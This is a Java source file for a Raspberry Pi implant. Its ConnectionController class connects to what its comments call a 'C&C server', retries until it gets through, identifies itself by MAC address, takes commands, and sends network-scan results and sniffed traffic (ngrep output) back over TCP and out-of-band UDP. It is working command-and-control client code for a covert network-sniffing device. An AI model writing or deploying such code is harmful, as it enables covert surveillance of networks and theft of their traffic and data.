package rPi.controllers;
import java.io.BufferedReader;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;

import rPi.connectors.Connector;

import rPi.connectors.IConnector;


/**
 * This class has the responsibility for networking and "calling home"
 * 
 * @author Niclas
 */

public class ConnectionController {

	//====== THE CONSTANTS YOU MIGHT WANNA CHANGE ======//
	
	private static InetAddress SERVER_IP;
	private static short DEFAULT_PORT = 9000; // the TCP port the server listens on
	private static int UDP_PORT_TO_SEND_FROM = 15000;
	private static int RECONNECT_INTERVAL_SECONDS = 10;
	private static String MAC_ADDR;
	
	//=================================================//
	
	IConnector con = new Connector();
	BufferedReader inputFromServer;
	String fromServer;
	
	public ConnectionController(String mac){
		this.MAC_ADDR = mac;
	}

	/**
	 * This method connects to the C&C server through TCP, if it's unavailable it reconnects after the interval
	 * 
	 * @return A buffered reader with commands from server
	 */
	public BufferedReader connectToServer(String server_ip){
		// from here we get the command from the C&C server
		try {
			SERVER_IP = InetAddress.getByName(server_ip);
		} catch (UnknownHostException e1) {
			System.out.println("Could not resolve server ip to InetAddress");
			e1.printStackTrace();
		}
		con.initTCPClient();
		// The loop that tries to connect to server once in a while
		while (inputFromServer == null){
			 inputFromServer = con.createConnection(SERVER_IP, DEFAULT_PORT);
			if (inputFromServer == null){
				try {
					Thread.sleep(RECONNECT_INTERVAL_SECONDS);
				} catch (InterruptedException e) {
					System.out.println("interrupted while sleeping, waiting to reconnect");
					e.printStackTrace();
				}
			}
		}
		
		System.out.println("tcp initialized"); // useless shit protocol HAVE TO BE MITIGATED!!! 
		
		// OUR PROTOCOL HANDSHAKE / WHATEVA
		con.sendTCP("mac\n");
		con.sendTCP(MAC_ADDR+ "\n");
		
		return inputFromServer;
	}
	/**
	 * Takes a BufferedReader as output and a portnumber and keeps sending udp (out-of-band) to the server
	 * @param outputStream
	 * @param portnr
	 */
	public void initAndSendUDP(BufferedReader outputStream, int portnr){
		con.initUDP(UDP_PORT_TO_SEND_FROM, portnr,SERVER_IP);  // extractportnumber skal fejltjekkes for port 0
		con.sendUDP(outputStream); // The start sniffing method returns a buffered reader with output from ngrep
	}
	/**
	 * Stops current out-of-band udp communication
	 */
	public void stopUDP(){
		con.stopUDP();
		UDP_PORT_TO_SEND_FROM++;
	}
	/**
	 * This method sends a string to the server through TCP and then a carriage return and newline
	 * @param str
	 */
	public void sendStringTCP(String str){
		con.sendTCP(str);
		con.sendTCP("\r\n");
	}
	/**
	 * This method sends an array of strings through TCP to the server. This is done when scanning networks etc.
	 * 
	 * @param arrList
	 */
	public void sendArrayTCP(ArrayList<String[]> arrList){
		for (String[] array : arrList){
			System.out.println("array length "+ array.length);
			String networkInfo = "";
			for (String str : array){
				System.out.println(str);
				networkInfo += str + "|";
			}
			System.out.println(networkInfo);
			con.sendTCP(networkInfo+"\n");
		}
		System.out.println("TCParray sent");
	}
	
}
